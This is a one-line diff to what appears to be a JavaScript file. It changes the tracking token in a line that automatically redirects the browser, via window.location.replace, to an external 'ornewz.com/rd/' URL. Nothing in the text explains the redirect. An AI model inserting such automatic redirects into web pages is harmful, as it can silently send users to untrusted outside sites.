@@ -1,1 +1,1 @@
-window.location.replace(``.concat(`http://ornewz.com/rd/su34044ceMIQ0wuzG14YvG0WIKW332`))
+window.location.replace(``.concat(`http://ornewz.com/rd/su34049Kbaej0uVVK14tas0QeUv303`))
